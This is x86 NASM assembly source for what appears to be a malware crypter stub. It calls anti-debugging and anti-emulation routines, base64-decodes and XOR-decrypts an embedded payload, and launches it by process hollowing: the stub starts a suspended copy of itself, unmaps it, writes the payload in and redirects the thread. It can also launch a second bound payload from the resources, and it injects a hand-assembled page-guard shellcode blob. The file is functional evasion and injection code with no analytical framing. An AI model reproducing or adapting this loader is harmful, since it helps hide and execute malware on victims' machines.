%include "include/global_constants.inc"
%include "include/section_addresses.inc"
%include "include/structures.inc"
%include "include/runpe_constants.inc"
%include "include/function_definitions.inc"
%include "include/strcmp_definitions.inc"
%include "include/payload_address.inc"
%include "include/payload_length.inc"

[ORG IMAGE_BASE + DATA_SECTION_ADDRESS]

jmp ENTRY_POINT

%include "include/strcmp.inc"

ENTRY_POINT:
	push ebp
	mov ebp, esp

	;===============================

	%include "include/delay_execution.inc"

	%include "include/fill_functions.inc"

	%include "include/anti_debug.inc"

	%include "include/anti_emulation.inc"

	;===============================

	;push szResourceName
	;push 23
	;call find_resource
	;push ecx
	;push eax
	;call b64_decode

	mov eax, TEXT_SECTION_ADDRESS
	add eax, PAYLOAD_ADDRESS
	mov ebx, [fs:30h]
	add ebx, 8
	add eax, [ebx]
	mov ecx, PAYLOAD_LENGTH
	push ecx
	push eax
	call b64_decode

	push ecx
	push eax
	call xor_decrypt

	push eax
	call pe_mapper

	push szBindResourceName
	push 23
	call find_resource
	cmp eax, 0
	jg exec_bind
	jmp exit_proc
	
	exec_bind:
		push ecx
		push eax
		call b64_decode
	
		push ecx
		push eax
		call xor_decrypt
	
		push eax
		call pe_mapper

	exit_proc:
		push 0
		call ExitProcess

	mov esp, ebp
	pop ebp
	ret

;===============================
;=== Xor Decrypt Func ==========
;=== Arg1: ptr_buf =============
;=== Arg2: len_buf =============
;=== Eax = ptr_dec_buf =========
;===============================
xor_decrypt:
	push ebp
	mov ebp, esp

	push ecx

	xor ebx, ebx
	xor ecx, ecx

	mov esi, dword [ebp + 8]
	lea edi, [KEY.FileKey]

	.loop:
		cmp ecx, 0x10
		jl .skipkeyset
		xor ecx, ecx
		.skipkeyset:
		mov al, [edi + ecx]
		xor [esi + ebx], al
		inc ebx
		inc ecx
		cmp ebx, dword [ebp + 12] 
		jl .loop

	.ret:
		mov eax, [ebp + 8]
		pop ecx

	mov esp, ebp
	pop ebp
	ret 8

;===============================
;=== Base64 Decode Func ========
;=== Arg1: ptr_b64_buf =========
;=== Arg2: len_b64_buf =========
;=== Eax = ptr_decode_buf ======
;=== Ecx = len_decode_buf ======
;===============================
b64_decode:
	push ebp
	mov ebp, esp
	sub esp, 12

	.alloc:
		push 0x04
		push 0x3000
		lea eax, [ebp + 12]
		push eax
		push 0x00
		mov [ebp - 4], dword 0
		lea eax, [ebp - 4]
		push eax
		push 0xFFFFFFFF
		call NtAllocateVirtualMemory

	.load_func:
		push szCrypt32
		call LoadLibraryA
		push szCryptStringToBinaryA	
		push eax
		call GetProcAddress
	
	.b64_decode_func:
		push 0 ;dwFlags
		push 0 ;dwSkip
		mov ecx, [ebp + 12]
		mov [ebp - 8], ecx
		lea ecx, [ebp - 8]	
		push ecx ;ptr to dword (on entry = size of receive_buffer, on exit = size written to receive buffer)		
		mov ebx, dword [ebp - 4]
		push ebx
		push 0x01 ;crypt_str_base64
		push dword [ebp + 12] ;b64 str len
		push dword [ebp + 8] ;ptr b64 len
		call eax

	.ret:
		mov eax, [ebp - 4]
		mov ecx, [ebp - 8]

	mov esp, ebp
	pop ebp
	ret 8

;===============================
;==== Resource Function ========
;==== Arg1: [In] ResID =========
;==== Arg2: [In] Ptr ResName ===
;==== Eax = Return Buffer ======
;==== Ecx = Buffer Size ========
;===============================
find_resource:
	push ebp
	mov ebp, esp
	sub esp, 8

	push dword [ebp + 8]
	push dword [ebp + 12]
	push 0
	call FindResourceW
	cmp eax, 0
	je .func_ret
	mov [ebp - 4], eax

	push eax
	push 0
	call LoadResource
	mov [ebp - 8], eax

	push dword [ebp - 4]
	push 0
	call SizeofResource
	mov ecx, eax

	push dword [ebp - 8]
	call LockResource

	.func_ret:
	mov esp, ebp
	pop ebp
	ret 8

;===============================
;===== RunPE Function ==========
;===== Arg 1: Ptr PE  ==========
;===============================

pe_mapper:
	push ebp
	mov ebp, esp
	mov esi, dword [ebp + 8] ;RunPE buffer

	; Alloc PROCESS_INFORMATION
		push 0x40
		push 0x3000
		lea eax, [ProcessInformationSize]
		push eax
		push 0x00
		lea eax, [ProcessInformation]
		push eax
		push -0x1
		call NtAllocateVirtualMemory
	;	int 3

	; Alloc STARTUP_INFORMATION
		push 0x04
		push 0x3000
		lea eax, [StartupInformationSize]
		push eax
		push 0x00
		lea eax, [StartupInformation]
		push eax
		push -0x1
		call NtAllocateVirtualMemory
		;int 3

	; Get Current Path Name
		mov eax, [fs:30h] ; PEB
		mov eax, [eax + 0ch] ; LDR
		mov eax, [eax + 0ch] ; InLoadOrder
		mov eax, [eax + 28h] ; Full Path Name

	create_proc:
	; CreateProcess
		mov ecx, [ProcessInformation]
		mov edx, [StartupInformation]
		push ecx
		push edx
		push 0x00
		push 0x00
		push 0x04
		push 0x00
		push 0x00
		push 0x00
		push eax
		push 0x00
		call CreateProcessW	
		;int 3

	; Alloc Context Information
		push 0x04
		push 0x3000
		lea eax, [ContextInformationSize]
		push eax
		push 0x00
		lea eax, [ContextInformation]
		push eax
		push 0xFFFFFFFF
		call NtAllocateVirtualMemory

	; NtGetContextThread
		mov eax, [ContextInformation]
		mov [eax], dword 65543
		push eax
		mov ecx, [ProcessInformation]
		mov ecx, [ecx + 4]
		push ecx
		call NtGetContextThread

	; Get Current ImageBase
		mov eax, [fs:30h]
		mov eax, [eax + 0ch]
		mov eax, [eax + 0ch]
		mov eax, [eax + 18h]
		mov [CurrentBase], eax

	; Get Target ImageBase & ImageSize
		mov eax, esi
		mov eax, [eax + 3ch]
		add eax, esi
		mov ecx, [eax + 50h]
		mov eax, [eax + 34h]
		mov [TargetBase], eax
		mov [ImageSize], ecx
	
	; Unmap Address
		mov ecx, [CurrentBase]
		cmp eax, ecx
		jne .nounmap
		push dword [CurrentBase]
		mov eax, dword [ProcessInformation]
		push dword [eax]
		call NtUnmapViewOfSection

	; Continue Mapping
	.nounmap:	
		push 0x40
		push 0x3000
		lea eax, [ImageSize]
		push eax
		push 0x00
		lea eax, [TargetBase]
		push eax
		mov eax, [ProcessInformation]
		push dword [eax]
		call NtAllocateVirtualMemory

	; Copy Headers
		mov eax, esi
		mov eax, [eax + 3ch]
		add eax, esi
		mov eax, [eax + 54h]
		push 0x00
		push eax
		push esi
		push dword [TargetBase]
		mov eax, [ProcessInformation]
		push dword [eax]
		call NtWriteVirtualMemory

	; # of sections
		mov eax, esi
		mov eax, [eax + 3ch]
		add eax, esi
		mov ax, [eax + 06h]
		mov [NumberOfSections], ax

	; Get First Section Offset
		mov eax, esi
		mov eax, [eax + 3ch]
		add eax, esi
		mov ecx, eax
		xor edx, edx
		mov dx, [eax + 14h]
		add ecx, 18h
		add ecx, edx
		mov dx, 0
		
	; Copy Sections
	.copy_sections:
		push ecx
		push edx
		push 0x00
		push dword [ecx + 10h]
		mov eax, [ecx + 14h]
		add eax, esi
		push eax
		mov eax, [TargetBase]
		add eax, [ecx + 0ch]
		push eax
		mov eax, [ProcessInformation]
		push dword [eax]
		call NtWriteVirtualMemory
		pop edx
		pop ecx
		add ecx, 40
		inc edx
		cmp dx, [NumberOfSections]
		jl .copy_sections

	; Write EntryPoint
		mov eax, [fs:30h]
		add eax, 0x08
		push 0x00
		push 0x04
		push dword [TargetBase]
		push dword [eax]
		mov eax, [ProcessInformation]
		push dword [eax]	
		call NtWriteVirtualMemory

	; NtSetContextThread
		mov eax, esi
		mov eax, [eax + 3ch]
		add eax, esi
		mov eax, [eax + 28h]
		add eax, [TargetBase]
		
	;==============THIS IS WHERE PAGE GUARD GETS APPLIED=================
	;=======THIS CAN BE MADE MODULAR, ADD OR REMOVE THESE LINES==========
		;preserve old EP
		push eax

		;Allocate memory for payload
		push 0x40
		push 0x3000
		lea eax, [PageGuardPayloadSize]
		push eax
		push 0x00
		lea eax, [PageGuardRemoteAddress]
		push eax
		mov eax, [ProcessInformation]
		push dword [eax]
		call NtAllocateVirtualMemory

		;Apply fixups
		mov eax, [PageGuardRemoteAddress]
		mov [PageGuardPayload + PAGE_GUARD_OFFSET_1], eax
		mov [PageGuardPayload + PAGE_GUARD_OFFSET_3], eax
		pop eax
		mov [PageGuardPayload + PAGE_GUARD_OFFSET_2], eax
		
		;Write memory
		push 0x00
		push 544
		push dword PageGuardPayload
		push dword [PageGuardRemoteAddress]
		mov eax, [ProcessInformation]
		push dword [eax]
		call NtWriteVirtualMemory

		mov eax, [PageGuardRemoteAddress]
	;====================================================================
		mov ecx, [ContextInformation]
		mov [ecx + 0B0h], eax
		push dword [ContextInformation]
		mov eax, [ProcessInformation]
		push dword [eax + 4]
		call NtSetContextThread

	; NtResumeThread
		push 0x00
		mov eax, [ProcessInformation]
		push dword [eax + 4]
		call NtResumeThread

	mov esp, ebp
	pop ebp
	ret 4

%include "include/function_buffer.inc"
%include "include/FunctionFinder.inc"

szResourceName: db "?", 0, 0, 0 
szBindResourceName: db "%", 0, 0, 0

SizeOfDecodedFile: dd 0

szCrypt32: db "Crypt32.dll",0
szCryptStringToBinaryA: db "CryptStringToBinaryA",0

FileBuffer: dd 0

KEY:
	.FileKey: 
		incbin "include/payload_key.bin"

ImageSize: dd 0
NumberOfSections: dw 0

NtProcessInformation: dd 0
OldProtection: dd 0

CurrentBase: dd 0
TargetBase: dd 0

ProcessInformation: dd 0
ProcessInformationSize: dd 16
StartupInformation: dd 0
StartupInformationSize: dd 68
ContextInformation: dd 0
ContextInformationSize: dd 716
DebugEvent: dd 0
DebugEventSize: dd 60h

PageGuardRemoteAddress: dd 0
PageGuardPayload:

db  0xBE, 0xEF, 0xBE, 0xAD, 0xDE, 0xEB, 0x60, 0xED, 0xAD, 0x0F, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00
db  0x00, 0x00, 0x00, 0x1C, 0x20, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x00, 0x00
db  0x52, 0x74, 0x6C, 0x41, 0x64, 0x64, 0x56, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x65, 0x64, 0x45, 0x78
db  0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x56
db  0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00, 0x56, 0x69, 0x72, 0x74
db  0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
db  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C
db  0x8B, 0x40, 0x0C, 0x8B, 0x00, 0xE8, 0x6A, 0x00, 0x00, 0x00, 0x8B, 0x00, 0xE8, 0x63, 0x00, 0x00
db  0x00, 0x8D, 0x86, 0x8E, 0x01, 0x00, 0x00, 0x50, 0x6A, 0x01, 0xFF, 0x96, 0x5B, 0x00, 0x00, 0x00
db  0x64, 0x8B, 0x0D, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x49, 0x08, 0x89, 0x8E, 0x0B, 0x00, 0x00, 0x00
db  0x68, 0x00, 0x10, 0x00, 0x00, 0x8D, 0x86, 0x13, 0x00, 0x00, 0x00, 0x50, 0xFF, 0xB6, 0x0B, 0x00
db  0x00, 0x00, 0xFF, 0x96, 0x5F, 0x00, 0x00, 0x00, 0x8D, 0x86, 0x0F, 0x00, 0x00, 0x00, 0x50, 0x8B
db  0x86, 0x1B, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x00, 0x50, 0x68, 0x00, 0x10, 0x00, 0x00
db  0xFF, 0xB6, 0x0B, 0x00, 0x00, 0x00, 0xFF, 0x96, 0x63, 0x00, 0x00, 0x00, 0x8B, 0x86, 0x07, 0x00
db  0x00, 0x00, 0xFF, 0xE0, 0x55, 0x89, 0xE5, 0x50, 0x8B, 0x40, 0x18, 0x89, 0xC1, 0x8B, 0x49, 0x3C
db  0x01, 0xC1, 0x8B, 0x49, 0x78, 0x83, 0xF9, 0x00, 0x74, 0x61, 0x01, 0xC1, 0xBB, 0x00, 0x00, 0x00
db  0x00, 0x8B, 0x51, 0x20, 0x01, 0xC2, 0x8B, 0x14, 0x9A, 0x01, 0xC2, 0x53, 0xBB, 0x00, 0x00, 0x00
db  0x00, 0x8B, 0xBC, 0x9E, 0x14, 0x00, 0x00, 0x00, 0x8D, 0x3C, 0x37, 0x50, 0x51, 0x52, 0x57, 0x52
db  0xE8, 0x3B, 0x00, 0x00, 0x00, 0x5A, 0x59, 0x58, 0x75, 0x24, 0x5F, 0x57, 0x51, 0x56, 0x8B, 0x51
db  0x24, 0x01, 0xC2, 0x8B, 0x71, 0x1C, 0x01, 0xC6, 0x31, 0xC9, 0x66, 0x8B, 0x0C, 0x7A, 0x8B, 0x34
db  0x8E, 0x89, 0xF1, 0x01, 0xC1, 0x5E, 0x89, 0x8C, 0x9E, 0x5B, 0x00, 0x00, 0x00, 0x59, 0x43, 0x83
db  0xFB, 0x03, 0x75, 0xBD, 0x5B, 0x43, 0x3B, 0x59, 0x18, 0x75, 0xA6, 0x58, 0x89, 0xEC, 0x5D, 0xC3
db  0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x8B, 0x4D, 0x0C, 0x83, 0xEC, 0x01, 0xC6, 0x45, 0xFF, 0xFF
db  0x8A, 0x10, 0x8A, 0x31, 0x38, 0xF2, 0x75, 0x0C, 0xC6, 0x45, 0xFF, 0x00, 0x84, 0xD2, 0x74, 0x04
db  0x40, 0x41, 0xEB, 0xE8, 0x80, 0x7D, 0xFF, 0x00, 0x89, 0xEC, 0x5D, 0xC2, 0x08, 0x00, 0x55, 0x89
db  0xE5, 0x56, 0x53, 0x51, 0xBE, 0xEF, 0xBE, 0xAD, 0xDE, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x5D
db  0x08, 0x8B, 0x1B, 0x81, 0x3B, 0x01, 0x00, 0x00, 0x80, 0x74, 0x0A, 0x81, 0x3B, 0x04, 0x00, 0x00
db  0x80, 0x74, 0x21, 0xEB, 0x62, 0x8B, 0x5D, 0x08, 0x8B, 0x5B, 0x04, 0x8B, 0x8B, 0xC0, 0x00, 0x00
db  0x00, 0x81, 0xC9, 0x00, 0x01, 0x00, 0x00, 0x89, 0x8B, 0xC0, 0x00, 0x00, 0x00, 0xB8, 0xFF, 0xFF
db  0xFF, 0xFF, 0xEB, 0x43, 0x68, 0x00, 0x10, 0x00, 0x00, 0x8D, 0x86, 0x13, 0x00, 0x00, 0x00, 0x50
db  0xFF, 0xB6, 0x0B, 0x00, 0x00, 0x00, 0xFF, 0x96, 0x5F, 0x00, 0x00, 0x00, 0x8D, 0x86, 0x0F, 0x00
db  0x00, 0x00, 0x50, 0x8B, 0x86, 0x1B, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x01, 0x00, 0x00, 0x50, 0x68
db  0x00, 0x10, 0x00, 0x00, 0xFF, 0xB6, 0x0B, 0x00, 0x00, 0x00, 0xFF, 0x96, 0x63, 0x00, 0x00, 0x00
db  0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xEB, 0x00, 0x59, 0x5B, 0x5E, 0x89, 0xEC, 0x5D, 0xC2, 0x04, 0x00

PageGuardPayloadSize: dd 544
PAGE_GUARD_OFFSET_1 EQU 0x001
PAGE_GUARD_OFFSET_2 EQU 0x007
PAGE_GUARD_OFFSET_3 EQU 0x195